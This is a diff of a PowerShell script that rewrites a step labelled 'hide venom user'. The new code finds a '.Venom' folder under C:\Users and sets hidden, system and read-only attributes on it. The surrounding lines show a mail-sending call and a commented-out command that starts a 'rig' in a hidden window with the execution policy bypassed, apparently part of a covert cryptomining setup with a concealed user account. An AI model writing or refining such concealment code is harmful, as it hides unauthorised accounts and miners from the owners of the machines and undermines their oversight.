@@ -227,8 +227,19 @@ Send-MailMessage `
 
 
 # hide venom user
-cd C:\Users
-attrib +h +s +r .Venom
+# Navigate to the C:\Users directory
+Set-Location -Path 'C:\Users'
+
+# Check if .Venom directory exists
+if (Test-Path -Path '.Venom' -PathType Container) {
+    # Set hidden, system, and read-only attributes to .Venom
+    attrib +h +s +r .Venom
+    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
+} else {
+    Write-Output ".Venom directory does not exist"
+    exit 1
+}
+
 
 # start rig
 #powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd
